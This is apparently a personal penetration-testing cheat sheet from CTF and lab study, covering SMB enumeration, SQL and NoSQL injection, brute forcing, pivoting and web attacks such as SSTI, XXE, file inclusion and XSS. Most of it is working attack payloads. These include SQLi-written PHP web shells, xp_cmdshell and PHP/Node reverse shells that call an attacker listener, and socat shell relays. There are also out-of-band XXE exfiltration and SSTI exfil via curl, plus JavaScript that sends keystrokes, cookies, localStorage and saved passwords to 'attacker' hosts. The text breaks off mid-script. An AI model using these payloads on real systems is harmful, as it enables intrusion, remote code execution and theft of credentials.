---
title: Notes
date: 2021-07-27
excerpt: "Dump of anything"
ShowToc: true

---



## Samba


What to do if samba port is open?

- Check for usernames `enum4linux -a 10.10.10.10`
- Smbclient
    - `smbclient -L //10.10.10.10`
    - `smbclient -L //10.10.10.10 -N`  **_No password (SMB Null session)_**
    - `smbclient --no-pass -L 10.10.10.10`
    - `smbclient //10.10.10.10/share_name`
    - `nmap -script=smb-vuln\* -p445 192.168.103.40`
- Smbmap
    - `smbmap -H 10.10.10.10`
    - `smbmap -H 10.10.10.10 -u '' -p ''`
    - `smbmap -H 10.10.10.10 -s share_name`
- CrackMapExec
    - `crackmapexec smb 10.10.10.10 -u '' -p '' --shares`
    - `crackmapexec smb 10.10.10.10 -u 'sa' -p '' --shares`
    - `crackmapexec smb 10.10.10.10 -u 'sa' -p 'sa' --shares`
    - `crackmapexec smb 10.10.10.10 -u '' -p '' --share share_name`

## SQLi
[Nice cheatsheet from hofmannsven](https://gist.github.com/hofmannsven/9164408)    

When testing remember to try different comments `-- -` `#`


`SELECT name, description FROM products WHERE id=9;` **_--- queries the db for name and desc in product table where id=9_**    
`SELECT -column list- FROM -table- WHERE -condition-` 

Example vulnerable code

`$id = $_GET['id'];`

`"SELECT name, desc FROM productes WHERE ID='$id';";`

`'a OR 'a'='a`

`SELECT name, desc FROM products WHERE ID='' OR 'a'='a';`

### Union
`SELECT <statement> UNION <other> SELECT statement;`  

`SELECT name, description FROM Products WHERE ID='3' UNION  SELECT username, password FROM accounts`  

With group_concat **_--- use when there's only 1 column? and sql is only showing the first entry_**

`0 UNION SELECT 1,2,group_concat(table_name) FROM information_schema.tables WHERE table_schema = 'sqli_one'`
**_sqli_one = db_**

`0 UNION SELECT 1,2,group_concat(column_name) FROM information_schema.columns WHERE table_name = 'staff_users'`  
**_staff_users = table_**

- single column concat `' UNION SELECT username || '~' || password FROM users--`

`1 UNION SELECT null,null,null,flag from exercise.secrets` where flag is column, exercise is db, secrets is table > null,null,null,null cause 4 columns


### Sorting
- can the app sort stuff? inject!
- delete value of param, inject stuff

### Boundary Testing
- same as sorting `order by 5` 

### Error Based Payloads
[sqlwiki netspi](https://sqlwiki.netspi.com/injectionTypes/errorBased/#oracle)
- MSSQL `cast(@@version as integer)`
    - `1+AND+8671+IN+(SELECT+(CHAR(0)%2b(SELECT+(CASE+WHEN+(8671%3d8671)+THEN+(SELECT+STRING_AGG(flag,+',')+from+exercise.information_schema.columns+where+TABLE_NAME+=+'secrets')`
- Postgresql `cast(version() as integer)`
- MYSQL `extractvalue('',concat('>',version()))`
- Oracle `to_char(dbms_xmlgen.getxml('select "'|| (select substr(banner,0,30) from v$version where rownum=1)||'" from sys.dual'))` 

### Stacked Queries

- `asc;select+flag+from+flags;` adding another query after the param value `asc`
- `1;WAITFOR DELAY '0:0:5'--`
- for postgresql `;SELECT+PG_SLEEP(5)--`

### Boolean

- `(SELECT (CASE WHEN (4255=4255) THEN 1 ELSE (SELECT 9369 UNION SELECT 1823) END))`

### Reading and Writing Files

- Postgresql;
    - To read a file and then save to a table `create table tmp(data text); copy tmp from '/etc/passwd'; select * from tmp;`
    - Alternative is `select pg_read_file('/etc/passwd')`
- MYSQL
    - Check if mysql is configured to read all files `SELECT @@GLOBAL.secure_file_priv;` this will return what folder we have access to. If output is null meaning it is disabled and we can read anything.
    - To write a file use `into outfile` `SELECT * FROM users INTO OUTFILE '/var/lib/mysql-files/test.txt'` The file location must be writable to the OS user the database software is running as. The `/var/lib/mysql-files` is the output of `SELECT @@GLOBAL.secure_file_priv` **_I have a note of `into outfile` in ReadME.md_**
    - To read the file use `load_file()` `SELECT LOAD_FILE('/var/lib/mysql-files/test.txt')`


### Blind SQLi / Manual Bruteforce

`select substring(user() , 1, 1) = 'r';`  

`' or substr (user(), 1, 1)= 'a`  

`admin123' UNION SELECT 1,2,3 FROM information_schema.COLUMNS WHERE TABLE_SCHEMA='sqli_three' and TABLE_NAME='users' and COLUMN_NAME like 'a%';`

`admin123' UNION SELECT 1,2,3 where database() like 's%';--`

`admin123' UNION SELECT 1,2,3 FROM information_schema.tables WHERE table_schema = 'sqli_three' and table_name='users';--`

`admin123' UNION SELECT 1,2,3 from users where username like 'a%`

#### Blind SQL in a cookie

`TrackingId=xyz'||(SELECT '' FROM dual)||'` **_test on cookie header TrackingId is a cookie_**

`'||(SELECT Case When (1=1) then to_char(1/0) else '' end FROM dual)||'`

`'||(SELECT Case When (1=1) then to_char(1/0) else '' end FROM users where username='administrator') ||'`

`'||(SELECT Case When (1=1) then to_char(1/0) else '' end FROM users where username='administrator' and lenght(password)>1) ||'`

`'||(SELECT Case When (1=1) then to_char(1/0) else '' end FROM users where username='administrator' and substr(password,1,1)='a') ||'`

`' AND CAST((SELECT 1) AS int)--`
`' AND 1=CAST((SELECT username FROM users LIMIT 1) AS int)--`
`' AND 1=CAST((SELECT version()) AS int)--`

**_Limit output of rows = rownum=1  ---same as Limit 1 for mysql_**
**_This is syntax is for oracle - Dual is a default table_**

- updating entry `UPDATE wp_users SET user_pass="5f4dcc3b5aa765d61d8327deb882cf99" where id=1`

What to do when there is a confirmed injection point?

- Determine how many columns using:

`' UNION SELECT null;-- -` **_or by using ORDER BY #-- -_**

`' UNION SELECT 'asd', 'asd';-- -` **_asd should appear somewhere_**

**_NOTE Check if it accepts string or integer_**

- After enumerating the number of columns continue with Union injections

### Querying Version, db, Table_name, user()

`1 union select 1, @@version, 3, 4`

`1 union select 1, database(), 3, 4`

`1 union select 1, table_name, 3, 4 fomr information_schema.tables`

`1 union select 1, column_name, 3, 4 fomr information_schema.columns`

`' UNION SELECT user(), 'asd';-- -`

One column available get username and password **_or group_concat maybe?_**

`'+UNION+SELECT+NULL,username||'~'||password+FROM+users--`

### Uploading Shell SQLi

-  `<value>' INTO OUTFILE '/var/www/html/shell.php' LINES TERMINATED BY 0x3C3F706870206563686F20223C7072653E22202E207368656C6C5F6578656328245F4745545B22636D64225D29202E20223C2F7072653E223B3F3E-- -`
   -  `INTO OUTFILE '/var/www/html/shell.php` **_output file to shell.php /var/www/html most common default location_**
   -  `0x3C3F706870206563686F20223C7072653E22202E207368656C6C5F6578656328245F4745545B22636D64225D29202E20223C2F7072653E223B3F3E` Hex of `<?php echo "<pre>" . shell_exec($_GET["cmd"]) . "</pre>";?>` **_or hex of the actual php reverse shell from pentest monkey_**

### sqli RCE

- MSsql
  - `xp_cmdshell` takes a string and passes it to a cmd shell for execution **_Disabled by default_**
  - If DB user has appropriate permissions we can enable xp_cmdshell using
```bash
EXECUTE sp_configure 'show advanced options', 1;  
GO
RECONFIGURE;  
GO 
EXECUTE sp_configure 'xp_cmdshell', 1;  
GO 
RECONFIGURE;  
GO
```

- MSSQL
    - `xp_cmdshell`
    - If `xp_cmdshell` is enabled call it using `EXECUTE xp_cmdshell 'command to run here';` **_Linux does not support several functions_**
    - If DB user has appropriate permissions we can enable xp_cmdshell using the ff:
      - `EXECUTE sp_configure 'xp_cmdshell',1; RECONFIGURE;` **_enables xp_cmdshell_**
      - then `EXEC xp_cmdshell 'curl http://192.168.48.2:8000/a.sh';` 
      - `EXEC xp_cmdshell 'bash a.sh'; `

In order of usage

- `EXECUTE sp_configure 'show advanced options',1; RECONFIGURE;`
- `EXECUTE sp_configure 'xp_cmdshell',1; RECONFIGURE;`
- `EXEC xp_cmdshell 'curl http://192.168.48.2:8000/itworked';` confirm RCE using this
- `EXEC+xp_cmdshell+'curl+http://192.168.48.2:8000/RevShell.java+--output+%temp%/RevShell.java'; ` for windows
- `EXEC xp_cmdshell 'java %temp%/RevShell.java';` for windows dont forget to url encode the `%`

```bash
- To allow advance options to be changed.

EXECUTE sp_configure 'show advanced options', 1;  
GO
- To update the currently configured value for advance options.

RECONFIGURE;  
GO 
- To enable xp_cmdshell

EXECUTE sp_configure 'xp_cmdshell', 1;  
GO 
- To update currently config value for xp_cmdshell

RECONFIGURE;  
GO
```
- example  `index.php?id=7%20UNION%20SELECT%20*%20from%20flags%20INTO%20OUTFILE%20%27/var/www/html/shell.php%27%20LINES%20TERMINATED%20BY%200x3C3F706870206563686F20223C7072653E22202E207368656C6C5F6578656328245F4745545B22636D64225D29202E20223C2F7072653E223B3F3E;--%20-`

### SQLMap

[cheatsheet](https://www.comparitech.com/net-admin/sqlmap-cheat-sheet/)

- `sqlmap -u <URL> -p <injection parameter> [options]`

- `sqlmap -u "http://test.site/view.php?id=1" -p id --technique=U` **_technique used is Union_**

- `sqlmap -u "http://test.site/view.php?id=1" --tables`

- `sqlmap -u "http://test.site/view.php?id=1" --current-db <dbname> -columns`

- `sqlmap -u "http://test.site/view.php?id=1" --current-db <dbname> --dump`

- `sqlmap -u "http://test.site/view.php?id=1" -D <dbname> -T <tablename> -C <Column> --dump1`

- `sqlmap -u http://target/whatever --method POST --data "db=mysql&name=asd&sort=id&order=asc" -p "name,sort,order"`
    - `-p` parameters to test with from `--data`
    - `--data` post body
- `sqlmap -u http://attack/whatever --method POST --data "db=mysql&name=asd&sort=id&order=asc" -p "name,sort,order" --dbms=mysql --dump`
    - `--dbms` specify what dbms in use
    - `--dump` dump all contents of all tables in the db


For Post Params/data

`sqlmap -u <URL> --data=<POST STRING> -p <PARAMETER> [options]`

Sometimes you don't need the **'**

`id=1 OR 1=1`

## NoSQLi

### MongoDB

[PayloadAlltheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/NoSQL%20Injection)
- default port is 2701
- mongo to start - show databases, use whatever
- `db.createCollection("users")` , `db.users.insert({id:"1", username: "admin", email: "admin@test.test", password: "password"})` , `db.users.find()` , `db.users.update({id:"2"}, {$set: {username: "test"}});`
- `.bson` supports json
- `username[$eq]=admin&password[$ne]=asd`
- collections = tables, documents = rows, fields = columns
- $and = AND, $or = OR
   - $eq = matches records that equal to a certain value
   - $ne = matches records that are not equal to a certain value
   - $gt = matches records that are greater than a certain value.
   - $where = matches records based on Javascript condition
   - $exists = matches records that have a certain field
   - $regex = matches records that satisfy certain regular expressions.
  - `mongo mongodb://admin:pass@192.168.120.186:27017/`

## Bruteforcing

### Basic Auth

`hydra -L user.txt -P rockyou.txt <machine-ip> http-head /` 

`hydra -L user.txt -P rockyou.txt <machine-ip> http-get /`

### SMB

`hydra -L user.txt -P rockyou.txt -m <domain> <ip> smb` **_or metasploit_**

### FTP

`hydra -C /usr/share/seclists/Passwords/Default-Credentials/ftp-betterdefaultpasslist.txt 192.168.120.161 ftp`

### mysql

`hydra -l 'root' -P ~/tools/SecLists/Passwords/rockyou.txt 192.168.134.118 mysql` 

## TCPdump

### Monitor your injections with tcpdump

Ping yourself and run `tcpdump -i <interface> icmp`  

## Pivoting/PortForwading/Tunneling

### Used msfconsole muti/handler

[Therennox YOTF writeup](https://therennox.github.io/thm/yearOfTheFox)   

### Socat

Opening 8888 in the victim to connect to victim 22 **_in this scenario only localhosts is allowed to victim 22_**  
`/tmp/socat tcp-listen:8888,reuseaddr,fork tcp:localhost:22`  
read more here [Muirlandoracle YOTF writeup](https://tryhackme.com/resources/blog/year-of-the-fox-official-write-up) or [H0j3n's](https://h0j3n.medium.com/tryhackme-year-of-the-fox-631c7752fab2)

#### Reverse Shell Relay

`./socat tcp-l:8000 tcp:ATTACKING_IP:443 &`
   - tcp-l:8000 = used to create the first half of the connection -- ipv4 listener on tcp port 8000 of the victim
   - tcp:attacking_ip:443 = connects back to our local IP on port 443
   - & =  backgrounds the listener

This will connect back to our machine so we need to setup a netcat listener

`./nc-hyst 127.0.0.1 8000 -e /bin/bash`

#### Port Forwarding using Socat

`./socat tcp-l:33060,fork,reuseaddr tcp:172.16.0.10:3306 &`

- Watch [IPPSEC](https://www.youtube.com/watch?v=Auqt-NSB4SQ)

### ProxyChains

- proxy a netcat `proxychains nc 172.16.0.10 23`

- when using nmap w/ proxychains comment out proxy_dns inside the proxychains.conf file

- only tcp scan will work

- udp, syn and ping scan wont work - use -Pn

### Port Forwarding 

Local: From attacker to victim via SSH

**_Attacker --ssh--> 172.16.0.5 --http--> 172.16.0.10_**
- `ssh -L 8000:172.16.0.10:80 user@172.16.0.5 -fN` / ssh -i key -L 9000:10.10.10.75:80 10.10.10.73
   - f = backgrounds shell immediately
   - N = tells SSH that it doesn;t need to execute any command and just set up the connection 

Now we can access the webserver on 172.16.0.10 using our own box localhost:8000
**_Use this when victim-localhost has open port that is only accessible by victim-localhost itself_**

### Reverse Connection

When doing this to avoid reverse shell and to only allow port forwarding add `command="echo 'This account can only be used for port forwarding'",no-agent-forwarding,no-x11-forwarding,no-pty` at the beginning of the public key.

**_We have a shell on victim(05) and we want to use it as a reverse connection from our machine(20) to webserver_victim(10)_**
- `ssh -R 8000:172.16.0.10:80 kali@172.16.0.20 -i KEYFILE -fN`

### Plink.exe for Windows

Command Line version of PuTTY SSH Client

**_Reverse Connection from Victim to our Attacker Machine._**
**_.20 Attacker --- .05 Victim we have a shell from --- .10 Webserver_**
- `cmd.exe /c echo y | .\plink.exe -R 8000:172.16.0.10:80 kali@172.16.0.20 -i KEYFILE -N`

For the keyfile we need to convert it using puttygen tool
- `puttygen KEYFILE -o OUTPUT_KEY.ppk`

### Reverse SSH Tunnel 

Use when port is only accessible by victim local

`ssh -L 4444:10.10.125.232:8080`
   - 4444 port of victim you will access from outside
   - 10.10.125.232 victim's ip
   - 8080 local port you want to access inside the victim

## Web APP!

### Authentication

- Check created cookie is it a hashed value of user? change
- admin exist? try registering Admin
- add space before and after admin
- redirects to `/login.php` from `/` try intercepting response and change 302 Not Found to 200 OK
- Blacklisted? is `X-Forwarded-For header` allowed?
- Check timing might be different for username enumeration, make password extra long then check response time
- Blacklisted after a few tries? try alternating correct creds with bruteforced creds
- Valid users gets locked out **_Can be used to enum valid users_**
- PHP juggling bug send password as an array `username=admin&password[]=`
  - Code looks like this `if(strcmp($_REQUEST['password'], $password) == 0)` in the backend PHP compares input from a hardcoded string or db.

#### 2FA

- Manually access /account-page when asked for 2fa? might be able to bypass

#### Password Reset bypasses

- Use X-Forwarded-Host header. `X-Forwarded-Host: your-exploit-server-id.web-security-academy.net`  **_REMOVE HTTPS_**
   - log should show unique token for the victim

#### SAML

- b64decode SAMLResponse - Important Part is **_<NameID...>_**
   - Start SAML interaction > Intercept SAMLResponse > Tamper SAMLResponse > Forward Malicious SAMLResponse to SP
   - Base64 Decode SAMLResponse > Change **_<NameID..youremail>_** to **_<NameID..adminemail>_**

#### Outh2

- CSRF vulnerabilities

### Authorization

- IDOR
   - Can't IDOR directly? try in Edit, Delete, Modify etc.
   - add .json extension?
- Object with multiple attributes when signing up
   - `user[username]=evo&user[password]=evo&submit=Submit` **_maybe add user[admin]=true or 1? admin can also be exchanged to other stuff like organisation_id etc whatever is in use to bypass Authorization_**

### Code Injection

- Test with `'` `"` in every params just like sql. Some might give an error. **_we want it to error out then add a concat character(depends on what is used by website) example `"+"` for ruby. Or `""` maybe. NOTE:REMEMBER TO URL ENCODE `+` `%2b`_**
   - Errors out with `"`? try `example.com/?test=evo".system("id")."` **_`.` is used to concat in PHP_**
   - when website is sorting via PHP try to input `'` or `"` again
   - PHP version below 5 - Notice /pattern/? inject to /pattern/e then insert command phpinfo() to verify
   - '.phpinfo().' - replace phpinfo() with system("id") or what ever command
      - Ruby
         - `+` for concat
         - command inside ` 
      - Perl
         - `.` for concat
         - command inside `
      - Python [Sethsec](https://sethsec.blogspot.com/2016/11/exploiting-python-code-injection-in-web.html)
         - `+` for concat
         - `str(os.popen("ls").read())`
         - `str(__import__('os').system('id'))`
         - `str(__import__('os').popen('id').read())`
         - `str(__import__('os').popen(__import__('base64').base64decode('<command in base64>')).read())`
- Check browser network if it's loading any injectable params      

### Command Injection

- Try all characters for chaining commands [PayloadAlltheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Command%20Injection#chaining-commands)
- Straight out try *backtick* `reverse shell or ping` *backtick* or `$(<command>)` [PayloadAlltheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Command%20Injection#inside-a-command)
- try adding `;` `&` `|` `||` at the end of the command aswell. EX: `email=all3n@evo.test|sleep+5|`
- there's a script in etc
- blind and can't get a shell? maybe there's a writable directory /images? whoami>/var/www/images 
- we can use the semicolon (;), the logical AND (&&), the logical OR (||), and even a single pipe character (|)
- In addition to the semicolon, which allows us to chain multiple commands together in one statement, another unique separator for Linux is the newline (\n)
- URL encode. USE BURP.
- Use null statement `$()`
  - This technique also works for more complex payloads like `nc -nlvp 9090`, which becomes: `n$()c -n$()lvp 9090`
- Convert to base64 then decode
  - `echo+'Y2F0IC9ldGMvcGFzc3dkCg==+'|+base64+-d`
  - if no base64 use openssl
- Check for the following:

  Linux

  ![](/notes/nixinject.png)

  Windows

  ![](/notes/wininject.png)

- Node.js reverse shell `echo "require('child_process').exec('nc -nv 192.168.49.51 9090 -e /bin/bash')" > /var/tmp/offsec.js ; node /var/tmp/offsec.js` //tried with payloads in payload all the things but does not work needs the `> /var....` part at the end

#### PHP

- `php -r '$sock=fsockopen("192.168.49.51",9090);exec("/bin/sh -i <&3 >&3 2>&3");'`
  - `php -r` instructs php to run the command in quotes `$sock=fsockopen("192.168.49.51",9090);exec("/bin/sh -i <&3 >&3 2>&3");`
  - `$sock=fsockopen("192.168.49.51",9090)` establish a tcp socket to our attacker machine
  - `;exec("/bin/sh -i <&3 >&3 2>&3");` will call the function exec
- if `phpninfo()` is available check for `disable_functions` and `Document_root`

#### This worked for the year of the fox challenge

Client side filtering for symbols - used burp to bypass filtering   

`"target":"\" ; echo YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC40LjE0LjUxLzcwMDMgMD4mMQ== | base64 -d | bash; echo\""` **_this is a post request inside a search function_** 
`\` escapes the `"` character

### Directory Traversal

- `../../../../../../../etc/passwd`
- try reading the php file with the parameter ex: `file.php?file=/var/www/file.php`
- If it loads blank maybe it requires you to start with specific directory. ex: this one requires to start with `/var/www` `file.php?file=/var/www/../../../../../etc/passwd`
- add %00 at the end `../../../../../etc/passwd%00` **_fixed in php version 5.3.4_**
- try `/etc/passwd` without the `../../../../`
- `....//....//....//....//....//etc/passwd`
- url encode = %2E%2E%2F
- double url encode = %252E%252E%252F

### File Inclusion

- Loads php files - look for something like `?page=index.php` try injecting a `'` or `"` if it errors out
- Normal Directory traversal will work 
- Try injecting remote sites like `http://www.google.com` or your own controlled site `/?page=http://evohaxthepla.net/test.txt&cmd=id` **_test.txt contains a php one liner_**
- look for the following in the source code: 
   - `include`
   - `require`
   - `include_once` 
   - `require_once`
- `php://filter/resource=/etc/passwd`
- `php://filter/convert.base64-encode/resource=/etc/passwd`
- LFI to RCE via Log files
   -  include a malicious payload into services log files such as Apache, SSH, etc. then request log file via LFI
      - Example, a user can include a malicious payload into an apache log file via User-Agent or other HTTP headers. In SSH, the user can inject a malicious payload in the username section. 
      - `echo '<?php echo 'whatever    ';system($_GET['cmd']);?>'` > whatever.php 

### LDAP

- Test with `)` if you'll get an error [PayloadAllthethings](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/LDAP%20Injection)
- In a post request when signing in remove the whole post body ex: `username=asd&password=asd` delete this whole data.
- `adm*))%00`
-  `admin)(cn=*))%00&password=admin`

### Open Redirect

[PayloadAllthethings](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Open%20Redirect)
- webhook.site **_can be used to test?_**
- http and https is filtered can be bypassed by just doing `//google.com` **_check payloadallthethings for more_**

### CSRF

What to look for?
- no csrf token, no samesite attribute on the cookie
- Remove CSRF token
- SameSite=Lax prevents CSRF
- Change POST to GET
- CSRF token is not user specific 
   - Intercept CSRF thru proxy then drop it - use the intercepted CSRF token on the other account check if it works
-

### SSRF

[Owasp](https://cheatsheetseries.owasp.org/assets/Server_Side_Request_Forgery_Prevention_Cheat_Sheet_SSRF_Bible.pdf#page=9&zoom=100,96,210)

- Basically look for areas where the victim sends a request or downloads from another location ex: `assets.test.com`. And then try accessing localhost or other payloads. [PayloadAllthethings](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Request%20Forgery)
- Gopher `gopher%3a//localhost%3a80/XPOST%2520/api/admin/create%2520HTTP/1.1%250aContent-Length%3a%252029%250aContent-Type%3a%2520application/x-www-form-urlencoded%250a%250ausername%3dhyst2%26password%3dhyst2` manually add `%20` for spaces and `%0a` for new lines then urlencode the wholething
- try `file:///` and all other methods
- aws `169.254.169.254` 
- google cloud `metadata.google.internal`
- `file:///c:/windows/win.ini` `file:///etc/passwd`
- `curl gopher://127.0.0.1:9000/_GET%20/hello_gopher%20HTTP/1.1`

### SSTI

- Nice labs from [PortSwigger](https://portswigger.net/web-security/all-labs)
- Look for injectable parameters and then fuzz - [PayloadAllthethings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Server%20Side%20Template%20Injection/Intruder/ssti.fuzz) has a good wordlists.
- Check template statements like ex: dropdown where you can choose if you want to display firstname, Lastname etc. try to break out of the template statement `firstname}}{{7*7` [Port Swigger](https://portswigger.net/research/server-side-template-injection)
- Tornado lab in portswigger this worked `{{2*2}}{%+import+os+%25}{{os.system('whoami')}}` [hacktricks](https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection)
- ex: `{% import os %}{{ os.popen("whoami").read() }}`
- After finding a vulnerable parameter and determining what template engine is used. go to [PayloadAlltheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection) to check for code executions.

| Templating Engine | Language | Server/client Side |
| ---               | ---      | ---                |
| Twig              | PHP      |	Server Side       |
| Freemarker        |	Java     |	Server Side       |
| Pug/Jade          |JavaScript| 	Mostly Server Side|
| Jinja             | 	Python |  Server Side       |
| Handlebars        |JavaScript| 	Both              |
| Mustache          |	Multiple |	Varies            |

#### Twig
```php
<h1><?php echo $name ?></h1>
<p>Welcome to our site!</p>
<?php 
if ($isAdmin) {
  echo "<p>Henlo</p>";
}
?>
```
  - `{{7*7}}` `{{7*'7'}}` both are ok  = 49
  - Usually look for filter with `=>` they can be used with `system`
  - `{{['cat flag.txt']|map('system')}}`
  - `{{[0]|reduce('system','curl http://192.168.49.51/helloFromTheOtherSide')}}`
```php 
{% set output %} // used to exfill whoami from a form usigng craft cms
{{[0]|reduce('system','whoami')}}
{% endset %}
{% set exfill= output| url_encode %}
{{['curl http://192.168.49.191/a?exfill=' ~ exfill]|map('system')}}
```

#### Freemarker
```java
<h1>Hello ${name}!</h1> // INTERPOLATION $
<#if name == "allenxd"> //FTL TAG starts with #
The top reasons you're great:
  <#list reasons as reason> 
   ${reason?index + 1}: ${reason}
  </#list>
</#if>
```
  - more prone to xss as sometimes html is not escaped `<i>a</i>`
  - `${7*7}` ok `${7*'7'}` not 
  - `${"freemarker.template.utility.Execute"?new()("whoami")}`

#### Pug (jade) [PAYLOAD GENERATOR](https://github.com/VikasVarshney/ssti-payload)
```javascript
h1 Hello, #{name}
input(type='hidden' name='allenxd' value='true')

if showSecret
  - secret = ['x','y', 'z']
  p The secrets are: 
  each val in secret
    p #{val}
else
  p No secret for you!
  ```
  - Commonly integrated with Express framework in a Nodejs app  
  - `#{name}`
  - `child_process.spawnSync` executes commands (is not accessible by default need to require)
    - can be checked by `= require` if no access use `= global.process.mainModule.require`

PAYLOAD
```javascript
- var require = global.process.mainModule.require 
= require('child_process').spawnSync('whoami').stdout // will result to [object Object] without .spawnSync
```

#### Jinja
```python
<h1>Hey {{ name }}</h1>
{% if reasons %}
henlo here are the reasons:
<ul>
{% for r in reasons %}
	<li>{{r}}</li>
{% endfor %}
</ul>
{% endif %}
```
  - `{{5*"5"}}` = `55555`
  - `{{config|pprint}}`

#### Handlebars / Mustache
```java
<h1>Hello {{name}}</h1>
{{#if nicknames}}
Also known as:
  {{#each nicknames}}
      {{this}}
  {{/each}}
{{/if}}

We are using handlebars locally in your browser to generate this template
```
  - Mustache is logic-less only supports `if` statements
  - Mustache is too restrictive thats why handlebars was created.
  - check if Handlebars uses helpers specially `read` and `readdir` `{{read "/etc/passwd"}}`
```java
{{#each (readdir "/etc")}}
{{this}}
{{/each}}
```

- Craft CMS SSTI
  - vulnerable sprout forms plugin
  - blind ssti


#### TPLMap

- Python2 only 
- Snowscan usage of TPLmap on OZ HTB - [Snowscan](https://snowscan.io/htb-writeup-oz/#)

### File Upload

[PayloadAlltheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Upload%20Insecure%20Files)
- Change **_Content-Type_**
- For Apache web servers try uploading **_.htaccess_** with the following contents
  - `AddType application/x-httpd-php .l33t` this will allow the extension `.l33t` and treat it as php. Learned from portswigger lab (although .phtml worked in their lab xD)
- add nullbyte and check if the web app strips the nullbyte and .jpg at the end.
- magic bytes
  - upload a normal image strip some of the contents leave the magic bytes at the beginning then append your payload.
  or
  - `exiftool -Comment="<?php echo 'START ' . file_get_contents('/home/carlos/secret') . ' END'; ?>" <YOUR-INPUT-IMAGE>.jpg -o polyglot.php`
- Race condition? for fileuploads that checks for viruses etc. might have a small window that we can execute a php payload. use turbo intruder. [Portswigger Lab](https://portswigger.net/web-security/file-upload/lab-file-upload-web-shell-upload-via-race-condition)


### XXE

- [PayloadAlltheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XXE%20Injection)
- Check white spaces - only one newline from header!
- [Informit](https://www.informit.com/articles/article.aspx?p=27006&seqNum=3) XML structure
- Delete % from payloads you get in PayloadAlltheThings.

- if xml needs the `<>` as text xml needs to be enclosed in  a `CDATA` section

- Testing for XXE
```XML
<?xml version="1.0" ?>
<!DOCTYPE data [
<!ELEMENT data ANY >
<!ENTITY lastname "Replaced">
]>
<Contact>
  <lastName>&lastname;</lastName>
  <firstName>Tom</firstName>
</Contact>
```

- Retrieving files
```XML
<?xml version="1.0"?>
<!DOCTYPE data [
<!ELEMENT data ANY >
<!ENTITY lastname SYSTEM "file:///etc/passwd">
]>
<Contact>
  <lastName>&lastname;</lastName>
  <firstName>Tom</firstName>
</Contact>
```

- Out of band Testing ssrf
```XML
<?xml version="1.0"?>
<!DOCTYPE data [
<!ELEMENT data ANY >
<!ENTITY lastname SYSTEM "http://<our ip address>/somefile">
]>
<Contact>
  <lastName>&lastname;</lastName>
  <firstName>allenxd</firstName>
</Contact>
```

- Out of band dtd contents
```XML
<!ENTITY % content SYSTEM "file:///etc/passwd">
<!ENTITY % external "<!ENTITY &#37; exfil SYSTEM 'http://your ip address/out?%content;'>" >
```

```XML
<!ENTITY % content SYSTEM "file:///etc/timezone">
<!ENTITY % external "<!ENTITY &#37; exfil SYSTEM 'http://your ip address/out?%content;'>" >
```

send this
```XML
<?xml version="1.0" encoding="utf-8"?> 
<!DOCTYPE oob [
<!ENTITY % base SYSTEM "http://your ip address/external.dtd"> 
%base;
%external;
%exfil;
]>
<entity-engine-xml>
</entity-engine-xml>
```


#### XPATH

- [PayloadAlltheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XPATH%20Injection)
- `' or 1=1}/parent::*/child::node()%00`

### XSS 

- js can access cookies if they **_DO NOT HAVE_** the `httpOnly` flag enabled.
- [PayloadAlltheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XSS%20Injection)
- Test in all inputs and params
- `<script>fetch('/settings?new_password=pass123');</script>`?
- `<script src="http://192.168.49.194:8000/xss.js"></script>`
- all tags blocked? use custom tag 
```javascript 
   <script>
   location = 'https://acd21f001f9a7723c0f207c1008700d5.web-security-academy.net/?search=<xss+id%3dx+onfocus%3dalert(document.cookie)+tabindex%3d1>#x';
   </script>
```
- not sure but this worked, from burpsuite acad `%3Csvg%3E%3Ca%3E%3Canimate+attributeName%3Dhref+values%3Djavascript%3Aalert(1)+%2F%3E%3Ctext+x%3D20+y%3D20%3EClick%20me%3C%2Ftext%3E%3C%2Fa%3E`
- `<script>document.write('<iframe src=file:///etc/passwd></iframe>');</script>` read file xss?
- `<` is blocked? try `"onmouseover="alert(1)`
- Input for URL? try `javascript:prompt(1)` after clicking the link should trigger javascript prompt 1
#### Keylogger 

```javascript
function logKey(event){
	fetch("http://attacker:8000/k?key="+ event.key)
}

document.addEventListener('keydown', logKey);
```

Ref: https://developer.mozilla.org/en-US/docs/Web/API/Document/keydown_event

#### Reflected XSS

Craft malicious link > send to victim
- Search functions `http://blah.com/search?=<sCript>alert(1)</sCript>`

#### Reflected Client XSS

- `<img src='x' onerror='alert(1)'>`
- `<sCript>` tag shouldn't run in inner.html so use the above

#### Steal Cookie

```javascript

let cookie = document.cookie

let encodedCookie = encodeURIComponent(cookie)

fetch("http://attackerlistener:8000/exfil?data=" + encodedCookie)
```

#### Local Secrets

- localStorage > accessed using `window.localStorage`
- sessionStorage > accessed using `window.sessionStorage` keeps data until tab is closed

```javascript

let data = JSON.stringify(localStorage)

let encodedData = encodeURIComponent(data)

fetch("http://attackerlistener:8000/exfil?data=" + encodedData)

```

#### Stealing saved passwords

```javascript
let body = document.getElementsByTagName("body")[0]
 
   var u = document.createElement("input");
   u.type = "text";
   u.style.position = "fixed";
   //u.style.opacity = "0";
 
   var p = document.createElement("input");
   p.type = "password";
   p.style.position = "fixed";
   //p.style.opacity = "0";
 
   body.append(u)
   body.append(p)
 
   setTimeout(function(){ 
           fetch("http://attacker.ip/k?u=" + u.value + "&p=" + p.value)
    }, 5000);
 ```

#### stealing passwords external
- `<script src="http://myip/asd.js"></script>` store in target
- then host the following `asd.js`
```javascript
const newDiv = document.createElement("script");
const newContent = document.createTextNode('document.location="http://192.168.49.191/?c="+document.cookie');
newDiv.appendChild(newContent);
const currentDiv = document.getElementById("div1");
document.body.insertBefore(newDiv, currentDiv);
```
or
```javascript
document.body.onload = addElement;

function addElement () {
    // create a new script element
    const newDiv = document.createElement("script");
    const newContent = document.createTextNode('window.location="http://192.168.49.191/?c=" + document.cookie');
